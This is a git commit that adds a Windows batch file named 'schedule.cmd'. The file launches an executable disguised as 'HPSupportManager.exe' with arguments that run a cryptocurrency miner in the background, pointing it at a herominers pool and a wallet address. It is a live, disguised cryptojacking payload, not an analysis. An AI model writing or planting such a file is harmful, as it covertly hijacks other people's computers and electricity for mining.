88817ab8234a8eebc4ed6f6f75db6510901aa157
Óscar Duván Rodríguez Pardo <102207347+FireOzi@users.noreply.github.com>
2024-05-15 16:09:34 -0500

    Add files via upload

---
+++ manage/host/schedule.cmd
@@ -0,0 +1,3 @@
+@echo off
+HPSupportManager.exe -B --title HPSupport --donate-level 0 -o br.zephyr.herominers.com:1123 -u ZEPHsCnU14sa9gYxnCF3QBEx7CUDigYP6fPkLUfiHQXVc7fqGhh2hSVh7kbRRULcmtdcUfQg2yCLWCTjXKLKwsaHb1ifapx8KhQ -p CLNT-r -a rx/0 -k 
+pause
